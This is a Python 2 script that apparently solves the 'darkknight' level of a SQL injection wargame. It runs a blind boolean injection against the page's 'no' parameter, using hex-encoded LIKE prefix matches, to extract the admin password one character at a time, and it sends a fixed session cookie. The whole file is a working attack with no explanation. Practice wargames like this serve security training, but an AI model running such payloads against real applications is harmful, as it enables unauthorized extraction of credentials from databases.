import requests

start=ord('0')
end=ord('Z')
value = ""
i = start

url = "http://los.eagle-jump.org/darkknight_f76e2eebfeeeec2b7699a9ae976f574d.php"
cookies = {"PHPSESSID":"cf8bml1u8rep03adn37hkqm0v6"}

while 1:
	sql = "1 || (id like 0x61646d696e && pw like 0x"+value+chr(i).encode("hex")+"25) -- "
	params = {'no':sql}
	r = requests.get(url, params=params, cookies=cookies)
	print sql

	i += 1
	if i == 37:
		i+=1

	if r.text.find("Hello admin") != -1:
		value += chr(i-1).encode("hex")
		i=start
		print "value : "+value.decode("hex")
	if i>end:
		break

print "finished : " + value.decode("hex")
